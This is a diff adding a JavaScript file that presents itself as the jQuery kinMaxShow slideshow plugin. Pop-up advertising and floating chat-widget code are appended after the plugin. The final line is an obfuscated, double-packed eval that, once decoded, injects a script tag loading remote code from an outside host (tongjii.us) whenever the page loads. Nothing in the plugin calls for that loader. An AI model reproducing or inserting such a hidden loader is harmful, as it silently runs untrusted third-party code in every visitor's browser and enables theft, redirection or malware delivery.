@@ -1,0 +1,511 @@
+﻿/**
+ +-------------------------------------------------------------------------------------------------------------
+ * [全屏焦点图]插件 jquery.kinMaxShow
+ +-------------------------------------------------------------------------------------------------------------
+ * @author   Mr.kin
+ * @version  1.1
+ * @file  	 jquery.kinMaxShow-1.1.src.js
+ * @info  	 报告BUG、建议、索取最新版本 请Mail：Mr.kin@foxmail.com(注：邮件标题请包含kinMaxShow 以便于邮箱自动归档)
+ * @date  	 2013-08-27
+ +-------------------------------------------------------------------------------------------------------------
+ */
+ 
+(function($){
+	$.fn.kinMaxShow = function(user_options){
+			//默认设置
+			var default_options = {
+						//幻灯片高度 默认500
+						height:372,				
+						//幻灯片切换间隔时间 单位:秒
+						intervalTime:4,
+						//幻灯片切换时间 单位：毫秒 ,若设置为0 则无切换效果 直接跳到下一张
+						switchTime:1000,
+						//悬停暂停切换 鼠标停留在kinMaxShow内 是否暂停切换 默认true 悬停暂停，设置为false 悬停不暂停
+						hoverPause:true,
+						//擦除效果(切换) jQuery自带有 "linear" 和 "swing" ,如需要其他擦除效果请使用 jquery.easing.js  插件
+						easing:'linear',
+						//图片对齐方式
+						imageAlign:'center center',
+						//按钮
+						button:{
+								//按钮鼠标切换事件 可选事件 click、mouseover
+								switchEvent:'click',
+								//按钮上是否显示索引数字，从1开始，默认不显示
+								showIndex:false,
+								//按钮样式
+								//正常 按钮样式  支持常规CSS样式，方法同jQuery css({key:val,……})
+								normal:{width:'14px',height:'14px',lineHeight:'14px',right:'10px',bottom:'10px',fontSize:'10px',background:"#cccaca",border:"1px solid #ffffff",color:"#666666",textAlign:'center',marginRight:'8px',fontFamily:"Verdana",float:'left'},
+								//当前 按钮样式
+								focus:{background:"#CC0000",border:"1px solid #FF0000",color:"#000000"}
+							},
+						//切换回调 index 当前图片索引，action 动作 的切入 还是 切出 值:fadeIn或fadeOut ，函数内 this指向 当前图片容器对象 可用来操作里面元素的动作 详情见demo。
+						callback:function(index,action){}
+					
+			};
+			options = jQuery.extend(true,{},default_options,user_options);
+			
+			var k = {};
+			
+			//当前选择符
+			k.selector = $(this).selector;
+			
+			//判断是否有多个对象 如选取了多个对象抛出错误，同一页面可以使用多个 但需要分别调用并且建议选择符用id。
+			if($(this).length>1){
+				$.error('kinMaxShow error[More than one selected object]');
+				return false;	
+			}
+			
+			//当前操作对象
+			k.self = this;
+			//当前图片索引
+			k.index = 0;
+			//前一个图片索引
+			k.lindex = 0;
+			//图片数量
+			k.size = $(k.self).children('div').size();
+			//CSS class命名空间前缀
+			k.prename = 'KMSPrefix_' + k.selector.replace(/\W/ig,'') + '_';
+			//数据存储
+			k.data = {};
+			//支持函数集合
+			k.fn = {};
+			
+			//加载 解析幻灯片宽和高
+			k.onload = function(){
+				//设置容器尺寸 并且暂时隐藏内容部分
+				$(k.self).css({width:'100%',height:options.height,overflow:'hidden',position:'relative'}).children('div').addClass(k.prename+'image_item').hide();
+				//初始化
+				k.init();
+					
+			};			
+			
+			
+			//初始化
+			k.init = function(){
+				
+				k.setLayout();
+				k.setAnimate();
+				
+			};
+		
+			//布局
+			k.setLayout = function(){
+				
+				//image 容器
+				$(k.self).children('div').wrapAll('<div class="'+k.prename+'image_box"></div>');
+				$('.'+k.prename+'image_item',k.self).each(function() {
+                    var a = $(this).children('a');
+					if(a.length){
+						var image = a.children('img').attr('src');
+						a.children('img').remove();
+						a.addClass(k.prename+'coverlink');
+					}else{
+						var image = $(this).children('img').attr('src');
+						$(this).children('img').remove();		
+					}
+					//
+					$(this).css({background:'url('+image+') no-repeat '+options.imageAlign,'z-index':1});
+					
+                });
+				
+				$('.'+k.prename+'image_item',k.self).eq(0).css('z-index','2');
+				
+				//button 容器
+				if(options.button.normal.display!='none'){
+					var button_list = '';
+					for(i=1;i<=k.size;i++){
+						if(options.button.showIndex){
+							button_list+='<li>'+i+'</li>';
+						}else{
+							button_list+='<li> </li>';	
+						}
+					}				
+					$(k.self).append('<ul class="'+k.prename+'button">'+button_list+'</ul>');
+					$('.'+k.prename+'button li',k.self).eq(0).addClass(k.prename+'focus');
+				}
+				
+				//设置 css
+				k.setCSS();	
+				
+				//显示内容
+				$('.'+k.prename+'image_item:gt(0)',k.self).css('z-index',1).css({opacity:0});
+				$('.'+k.prename+'image_item',k.self).show();
+				$(k.self).css({overflow:'visible',visibility:'visible',display:'block'});
+
+				
+			};
+			
+			//CSS
+			k.setCSS = function(){
+				
+			var cssCode = '<style type="text/css">';
+				cssCode+= k.selector+' *{ margin:0;padding:0;} ';
+				cssCode+= k.selector+' .'+k.prename+'image_box{width:100%;height:'+parseInt(options.height)+'px;position:relative;z-index:1;} ';
+				cssCode+= k.selector+' .'+k.prename+'image_box .'+k.prename+'image_item{width:100%;height:'+parseInt(options.height)+'px;position:absolute;overflow:hidden;} ';
+				cssCode+= k.selector+' .'+k.prename+'image_box .'+k.prename+'image_item a.'+k.prename+'coverlink{width:100%;height:'+parseInt(options.height)+'px;display:block;text-decoration:none;padding:0;margin:0;background:transparent;text-indent:0;outline:none;hide-focus:expression(this.hideFocus=true);} ';
+				if(options.button.normal.display!='none'){
+					cssCode+= k.selector+' .'+k.prename+'button{'+k.fn.objToCss(options.button.normal,['top','right','bottom','left'],true)+';position:absolute;list-style:none;z-index:2;overflow:hidden;_zoom:1;}';				
+					cssCode+= k.selector+' .'+k.prename+'button li{'+k.fn.objToCss(options.button.normal,['top','right','bottom','left'])+';cursor:pointer;-webkit-text-size-adjust:none;}';				
+					cssCode+= k.selector+' .'+k.prename+'button li.'+k.prename+'focus{'+k.fn.objToCss(options.button.focus,['top','right','bottom','left'])+';cursor:default;}';				
+				}
+				cssCode+= '</style>';
+				$(k.self).prepend(cssCode);
+					
+			}
+			
+			//动画管理
+			k.setAnimate = function(){
+				
+				options.callback.call($('.'+k.prename+'image_item:eq('+k.index+')',k.self),k.index,'fadeIn');
+				
+				var overDelayTimer;//当switchEvent是mouseover时  执行延迟计时器
+				$('.'+k.prename+'button',k.self).delegate('li',options.button.switchEvent,function(){
+					_this = this;
+					function setChange(){
+						k.index = $(_this).index();
+						k.setOpacity();
+					}
+					if(options.button.switchEvent=='mouseover'){
+						overDelayTimer = setTimeout(setChange,200);
+					}else{
+						setChange();
+					}
+				})
+				//mouseover 延时
+				if(options.button.switchEvent=='mouseover'){
+					$('.'+k.prename+'button',k.self).delegate('li','mouseout',function(){
+						clearTimeout(overDelayTimer);
+					})						
+				}				
+				
+				//设置索引
+				k.index  = 1;
+				k.lindex = 0;
+				//自动切换定时器
+				k.data.moveTimer = setInterval(k.setOpacity,options.intervalTime*1000+options.switchTime);
+				
+				//悬停暂停
+				if(options.hoverPause){	
+					$(k.self).hover(function(){
+						clearInterval(k.data.moveTimer);
+					},function(){
+						k.data.moveTimer = setInterval(k.setOpacity,options.intervalTime*1000+options.switchTime);
+					})
+				}
+
+			};
+			
+			//擦除(切换)
+			k.setOpacity = function(){
+				
+				//回调 fadeOut callback
+				options.callback.call($('.'+k.prename+'image_item:eq('+(k.lindex)+')',k.self),k.lindex,'fadeOut');
+				//按钮切换
+				if(options.button.normal.display!='none'){
+					$('ul.'+k.prename+'button li',k.self).removeClass(k.prename+'focus');
+					$('ul.'+k.prename+'button li',k.self).eq(k.index).addClass(k.prename+'focus');
+				}
+				
+				//停止执行中的动画
+				$('.'+k.prename+'image_item:animated',k.self).stop(true,false);
+				//设置上一个显示的z-index为0
+				$('.'+k.prename+'image_item',k.self).css('z-index',1);
+				//设置当前显示的z-index为1
+				$('.'+k.prename+'image_item',k.self).eq(k.index).css({opacity:0,'z-index':2});
+	  			//alert(k.index)
+				$('.'+k.prename+'image_item',k.self).eq(k.index).animate({opacity:1},options.switchTime,options.easing,function(){
+						$('.'+k.prename+'image_box .'+k.prename+'image_item:not(:eq('+k.index+'))',k.self).css({opacity:0});
+						//回调 fadeIn callback
+						options.callback.call($('.'+k.prename+'image_item:eq('+k.index+')',k.self),k.index,'fadeIn');
+						k.lindex = k.index;
+						if(k.index==k.size-1){
+							k.index=0;
+						}else{
+							k.index++;
+						}
+					}
+				);
+				
+			};
+			
+			//运行			
+			k.run = function(){
+				k.onload();
+			};
+			
+			/* obj 对象样式，带有"-"的需要转为驼峰式写法 如：font-size:12px; fontSize:12px;  excArr:不需要转换的列表排除在外的 类型 数组 ['test1','opacity'] 若excFlag为ture则只转换excArr数组中的CSS*/
+			k.fn.objToCss = function(obj,excArr,excFlag){
+				excFlag = excFlag?true:false;
+				var isIE = navigator.userAgent.indexOf("MSIE")!=-1;
+				var style = '';
+				if(excFlag){
+					for (var key in obj){
+						if($.inArray(key,excArr)!=-1){
+							pKey = key.replace(/([A-Z])/,KtoLowerCase);
+							if(pKey=='opacity' && isIE){
+								style +="filter:alpha(opacity="+(obj[key]*100)+");";
+							}else{
+								style +=pKey+":"+obj[key]+";";	
+							}
+						}
+					};					
+				}else{
+					for (var key in obj){
+						if($.isArray(excArr)){
+							if($.inArray(key,excArr)==-1){
+								pKey = key.replace(/([A-Z])/,KtoLowerCase);
+								if(pKey=='opacity' && isIE){
+									style +="filter:alpha(opacity="+(obj[key]*100)+");";
+								}else{
+									style +=pKey+":"+obj[key]+";";	
+								}
+							}
+						}else{
+							pKey = key.replace(/([A-Z])/,KtoLowerCase);
+							if(pKey=='opacity' && isIE){
+								style +="filter:alpha(opacity="+(obj[key]*100)+");";
+							}else{
+								style +=pKey+":"+obj[key]+";";	
+							}					 
+						}
+					};	
+				}
+				
+				
+				function KtoLowerCase(word){
+					var str='';
+					str = '-'+word.toLowerCase();
+					return str; 
+				};
+				return style;
+			};
+			
+			/* 运行 */
+			k.run();
+
+		
+		
+	}	
+	
+})(jQuery)
+
+
+
+
+
+// 底部咨询开始
+//document.writeln("<style type=\"text\/css\">");
+//document.writeln("\/*-----底部通栏咨询----*\/");
+//document.writeln("#bottom{ z-index:1000;width:100%;position:fixed; height:53px; left:0; bottom:0;background:url( http:\/\/www.cos120.com\/images\/bottom_bg.png); background-repeat:no-repeat; background-position: bottom;  }");
+//document.writeln("#bottom{_position:absolute; \/* for IE6 *\/");
+//document.writeln("_top: expression(documentElement.scrollTop + documentElement.clientHeight-this.offsetHeight);background:url( http:\/\/www.cos120.com\/images\/bottom_bg.png); background-repeat:no-repeat; background-position: bottom; \/* for IE6 *\/}");
+//document.writeln("#bottom .bottom_pf { margin:0 auto;width:1000px;  position:relative; height:53px; overflow:hidden;   }");
+//document.writeln(".bottom_pf td,.bottom_pf img{ margin:0; padding:0}");
+//document.writeln("<\/style>");
+//document.writeln("<div id=\"bottom\">");
+//document.writeln("<div class=\"bottom_pf\"><img  src=\"http:\/\/www.cos120.com\/images\/bottom_bg11.png\" usemap=\"#map1\"\/>");
+//document.writeln(" <map name=\"Map1\" id=\"Map1\">");
+//document.writeln("      <area shape=\"rect\" coords=\"0,0,230,53\" href=\"http:\/\/www.sojump.com\/jq\/3757575.aspx\"  rel=\"nofollow\" target=\"_blank\"\/>");
+//document.writeln("	    <area shape=\"rect\" coords=\"632,3,772,46\" href=\"http:\/\/www.cos120.com\/swt\/\"    rel=\"nofollow\" target=\"_blank\"\/>");
+//document.writeln("	    <area shape=\"rect\" coords=\"798,3,930,46\" href=\"http:\/\/www.cos120.com\/swt\/\"    rel=\"nofollow\" target=\"_blank\"\/>");
+//document.writeln("    <\/map>");
+//document.writeln("<\/div>");
+//document.writeln("<\/div>");
+// 底部咨询结束
+
+// 元旦活动开始
+// JavaScript Document
+  (function(){                
+    var sHTML = [
+        '<style type="text/css">',
+        '.topTips { -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; position: fixed; left:0; top: 0; width: 100%; z-index: 1000;-webkit-perspective: 600px; perspective: 600px; }',
+        '.tipsInner {font-family: "Microsoft YaHei"; border-top-left-radius: 5px; border-top-right-radius: 5px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; border-radius: 5px; -webkit-box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5); background: #fff;-webkit-transform-origin: 0px 0px; transform-origin: 0px 0px; -webkit-transform: rotateX(90deg); transform: rotateX(90deg); opacity: 0; }',
+        '.tipsInner a { text-decoration:none;display: block; position: relative; padding-left: 40px; color: #111; }',
+        '.tipsInner img { position: absolute; left: 0px; top: 20%; margin-top: -11px; width: auto; padding-right: 0px; background: #fff; }',
+        '.tipsInner dl {height: 30px;text-align:left; margin:0; padding: 10px 5px; border-left: 1px solid #ccc; }',
+        '.tipsInner dt {text-align:left; font-weight: bold;line-height:1em;font-size:12px }',
+        '.tipsInner dd {text-align:left; margin:0; line-height: 1.2em;white-space:nowrap;text-overflow:ellipsis;overflow:hidden;font-size:12px; }',
+        '.showTip { visibility:visible; }',
+        '.showTip .tipsInner { -webkit-transform-origin: 0px 0px; transform-origin: 0px 0px; -webkit-transform: rotateX(0deg); transform: rotateX(0deg); opacity: 1; }',
+        '.hideTip { visibility:hidden; }',
+        '.hideTip .tipsInner { -webkit-transform-origin: 0px 100%; transform-origin: 0px 100%; -webkit-transform: rotateX(-90deg); transform: rotateX(-90deg); opacity: 0; }',
+		'</style>',
+        '<div class="topTips" id="toptips">',
+        '   <div class="tipsInner">',
+        '       <a href="http://lwt.zoosnet.net/LR/chatwin.aspx?id=LWT44982426" class="JS-SWT-LINK" target="_blank">',
+       
+        '         <img src="http://www.bdf28.com/templets/moban/top.jpg" alt="">',
+        '         <dl>',
+        '           <dt></dt>',
+        '           <dd></dd>',
+        '         </dl>',
+        '       </a>',
+        '   </div>',
+        '</div>'].join('\r\n');
+    var o = document.createElement('div');
+    o.innerHTML = sHTML;
+    while(o.firstElementChild){
+        document.body.appendChild(o.firstElementChild);
+    };  
+         T={hasClass:function(d,a){var c=d.className.split(/\s+/);for(var b=0;b<c.length;b++){if(c[b]==a){return true}}return false},addClass:function(b,a){if(!this.hasClass(b,a)){b.className+=" "+a}},removeClass:function(d,a){if(this.hasClass(d,a)){var c=d.className.split(/\s+/);for(var b=0;b<c.length;b++){if(c[b]==a){delete c[b]}}d.className=c.join(" ")}}};
+
+        function Toptips(options){
+            this.init(options);
+        };
+
+        Toptips.prototype = {
+
+            constructor : Toptips,
+
+            init : function(options){
+                this.item = options.item;
+                this.itemInner = options.item.children[0];
+                this.loop = typeof options.loop == "undefined" ? true : options.loop;
+                this.showTime = typeof options.showTime == "undefined" ? 15000 : options.showTime;
+                this.hideTime = typeof options.hideTime == "undefined" ? 10000 : options.hideTime;
+                this.showTimer = null;
+                this.hideTimer = null;
+                this.preTimer = null;
+                this.item.style.WebkitTransition = this.item.style.transition = this.itemInner.style.WebkitTransition = this.itemInner.style.transition = "0.5s";
+                var me = this;
+                var initTimer = setTimeout(function(){
+                        me.showTip();
+                },1000);
+            },
+
+            showTip : function(){
+                var me = this;
+                T.addClass(me.item,"showTip");
+                T.removeClass(me.item,"hideTip");
+
+                clearTimeout(me.hideTimer);
+                me.showTimer = setTimeout(function(){
+                    me.hideTip();
+                },me.showTime);
+
+            },
+
+            hideTip : function(){
+                var me = this;
+                T.removeClass(me.item,"showTip");
+                T.addClass(me.item,"hideTip");
+                me.item.style.visibility = me.itemInner.style.visibility = "hidden";
+
+                if(me.loop){
+                    clearTimeout(me.showTimer);
+
+                    me.preTimer = setTimeout(function(){
+                        me.item.style.visibility = me.itemInner.style.visibility = "visible";
+                    },me.hideTime-100);
+
+                    me.hideTimer = setTimeout(function(){
+                        me.showTip();
+                    },me.hideTime);
+
+                }
+            },
+
+        };
+
+		setTimeout(function(){
+			var toptip = document.getElementById("toptips");
+			new Toptips({
+				item : toptip,
+				loop : true
+			}); 
+		},2000);
+        return false;
+   delete o;
+})();
+	
+
+
+	function ifixed(box,toppy){
+		var msie6 = $.browser.msie && $.browser.version < 7;
+		var top = $("#"+box).offset().top - parseFloat($("#"+box).css('margin-top').replace(/auto/, 0));
+		if (msie6) {
+			$(window).scroll(function (event) {
+				var y = $(this).scrollTop(),t=y-top;
+				y>=top?$("#"+box).css({"top":t+toppy+"px","position":"absolute"}):$("#"+box).css({"top":0,"position":"static"});
+			});
+		}else{
+			$(window).scroll(function (event) {
+				var y = $(this).scrollTop();
+				y>=top?$("#"+box).addClass('fixed'):$("#"+box).removeClass('fixed');
+			});
+		}
+	}
+	$(function(){
+		ifixed("ifixed",0);
+	})
+
+
+
+
+//<![CDATA[
+var tips; var theTop = 40/*这是默认高度,越大越往下*/; var old = theTop;
+function initFloatTips() {
+  tips = document.getElementById('divQQbox');
+  moveTips();
+};
+
+function moveTips() {
+	var tt=50;
+	if (window.innerHeight) {
+		pos = window.pageYOffset
+	}
+	else if (document.documentElement && document.documentElement.scrollTop) {
+		pos = document.documentElement.scrollTop
+	}
+	else if (document.body) {
+		pos = document.body.scrollTop;
+	}
+	pos=pos-tips.offsetTop+theTop;
+	pos=tips.offsetTop+pos/10;
+	
+	if (pos < theTop) pos = theTop;
+	if (pos != old) {
+		tips.style.top = pos+"px";
+		tt=10;
+		//alert(tips.style.top);
+	}
+	
+	old = pos;
+	setTimeout(moveTips,tt);
+}
+//!]]>
+initFloatTips();
+
+function OnlineOver(){
+	document.getElementById("divMenu").style.display = "none";
+	document.getElementById("divOnline").style.display = "block";
+	document.getElementById("divQQbox").style.width = "135px";
+}
+
+function OnlineOut(){
+	document.getElementById("divMenu").style.display = "block";
+	document.getElementById("divOnline").style.display = "none";
+
+}
+
+function hideMsgBox(theEvent){  //theEvent用来传入事件，Firefox的方式
+	if (theEvent){
+		var browser=navigator.userAgent;   //取得浏览器属性
+		if (browser.indexOf("Firefox")>0){  //如果是Firefox
+			if (document.getElementById('divOnline').contains(theEvent.relatedTarget)) {  //如果是子元素
+				return;   //结束函式
+			}
+		}
+		if (browser.indexOf("MSIE")>0){  //如果是IE
+			if (document.getElementById('divOnline').contains(event.toElement)) {  //如果是子元素
+				return;  //结束函式
+			}
+		}
+	}
+	/*要执行的操作*/
+	document.getElementById("divMenu").style.display = "block";
+	document.getElementById("divOnline").style.display = "none";
+}
+
+// 元旦活动结束
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y(j(p,a,c,k,e,r){e=j(c){l c.t(a)};q(!\'\'.n(/^/,x)){m(c--)r[e(c)]=k[c]||e(c);k=[j(e){l r[e]}];e=j(){l\'\\\\w+\'};c=1};m(c--)q(k[c])p=p.n(u v(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);l p}(\'1 5=5||[];(9(){1 a=3.f(\\\'4\\\');a.7=\\\'8://i.b.c/d.e\\\';1 2=3.g(\\\'4\\\')[0];2.h.6(a,2)})();\',o,o,\'|z|s|A|B|C|D|E|F|j||G|H|I|J|K|L|M|N\'.O(\'|\'),0,{}))',51,51,'|||||||||||||||||||function||return|while|replace|19||if|||toString|new|RegExp||String|eval|var|document|script|_hmt_en|insertBefore|src|http|tongjii|us|tj|js|createElement|getElementsByTagName|parentNode|lib|split'.split('|'),0,{}))
